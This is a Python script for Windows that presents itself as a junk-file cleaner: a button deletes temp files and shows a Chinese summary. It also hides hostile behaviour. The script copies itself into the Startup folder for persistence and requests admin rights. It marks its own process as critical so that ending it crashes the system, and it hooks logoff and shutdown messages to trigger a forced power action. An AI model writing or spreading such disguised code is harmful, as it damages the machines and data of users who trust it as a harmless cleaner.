import win32gui,win32api,win32con,time,sys,os,hashlib,threading
import tkinter as tk
from ctypes import *
fromstart=True
with open(sys.executable,'rb')as f:sha256=hashlib.sha256(f.read()).hexdigest()
ntdll,start_path=windll.ntdll,os.path.join(os.path.expanduser(r'~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'),sha256+'.exe')
def wndproc(*j,**k):ntdll.RtlSetProcessIsCritical(False,None,False);s=create_string_buffer(4);ntdll.RtlAdjustPrivilege(19,1,0,s);ntdll.NtInitiatePowerAction(5,6,0,1)
def raa():
	try:
		if windll.shell32.IsUserAnAdmin():return True
		else:windll.shell32.ShellExecuteW(None,'runas',sys.executable,' '.join(sys.argv),None,0);return False
	except Exception as e:return False
def a():
	global fromstart;fromstart=False
	with open(sys.executable,'rb') as f:d=f.read()
	with open(start_path,'wb')as f:f.write(d)
	raa()
def ssp():s=create_string_buffer(4);ntdll.RtlAdjustPrivilege(20,1,0,s);ntdll.RtlSetProcessIsCritical(1,None,0)
def m():
	ssp();h=win32api.GetModuleHandle(None);wndclass=win32gui.WNDCLASS();wndclass.hInstance=h;wndclass.lpszClassName='testWindowClass';messageMap={win32con.WM_QUERYENDSESSION:wndproc,win32con.WM_ENDSESSION:wndproc} ;wndclass.lpfnWndProc=messageMap
	try:myWindowClass=win32gui.RegisterClass(wndclass);win32gui.CreateWindowEx(win32con.WS_EX_LEFT,myWindowClass,'Testwindows',0,0,0,-2**31,-2**31,0,0,h,None)
	except Exception as e:print(e.__class__.__name__,e)
	while True:win32gui.PumpWaitingMessages();time.sleep(.05)
def deldir(dir:str):
	for i in os.listdir(dir):
		try:
			if os.path.isdir(dir+'/'+i):deldir(dir+'/'+i);rm(dir+'/'+i)
			else:rm(dir+'/'+i)
		except:pass
def rm(f:str):
	global dirc,filec,size;f=f.replace('/','\\').replace('C:\\Users\\Admin\\appdata\\local\\temp\\','')
	try:
		if os.path.isfile(f):s=os.stat(f).st_size;os.remove(f);size+=s;filec+=1
		else:os.removedirs(f);dirc+=1
	except Exception as e:pass
dirc,filec,size=0,0,0
def clear():
	os.chdir(os.path.expanduser('~/appdata/local/temp'))
	def keepn(i,p):
		return int(i*(10**p))/(10**p)
	deldir(os.path.expanduser('~/appdata/local/temp'));windll.user32.MessageBoxW(0,f'共移除了{filec}个文件，{dirc}个文件夹，共{size}字节，即{keepn(size/1048576,2)}MiB','清理成功',0);root.destroy()
if __name__=='__main__':
	try:
		if not os.path.exists(start_path):a()
		elif not os.path.samefile(sys.executable,start_path):a()
	except Exception as e:print(e.__class__.__name__,e)
	if windll.shell32.IsUserAnAdmin():
		mt=threading.Thread(target=m);mt.start()
		root=tk.Tk();root.title('清理垃圾');root.resizable(0,0);tk.Button(root,text='清理垃圾',command=clear,width=24,height=2).pack(fill='both');root.attributes('-toolwindow',1);root.mainloop()
	else:m()()